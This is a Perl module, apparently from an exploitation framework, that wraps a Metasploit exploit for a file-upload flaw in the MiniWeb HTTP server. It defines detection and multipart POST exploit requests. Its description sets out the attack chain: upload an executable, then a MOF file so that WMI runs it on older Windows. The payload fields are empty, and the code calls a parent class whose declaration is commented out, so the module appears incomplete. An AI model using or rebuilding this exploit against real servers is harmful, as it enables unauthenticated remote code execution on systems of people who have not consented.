package MSFExploits::Exploits::MINIWEB::MSF::MiniwebUploadWbem;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::MINIWEB);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "MiniwebUploadWbem";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/FLxoEflmhsHcQ',
  PAYLOAD => '',
  TEXT => 'Checking If : /FLxoEflmhsHcQ Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a vulnerability in MiniWeb HTTP server (build 300).

        The software contains a file upload vulnerability that allows an

        unauthenticated remote attacker to write arbitrary files to the file system.



        Code execution can be achieved by first uploading the payload to the remote

        machine as an exe file, and then upload another mof file, which enables

        WMI (Management Instrumentation service) to execute the uploaded payload.

        Please note that this module currently only works for Windows before Vista.

      ",
  METHOD => "POST",
  MSF_MODULE => "miniweb_upload_wbem",
  OSVDB => 92200,
  VARIABLES => {
    'BOUNDARY' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'FLxoEflmhsHcQ',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #4 Request : [POST] /FLxoEflmhsHcQ',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=----WebKitFormBoundaryeuoHjFVRnx',
        'action' => '0',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
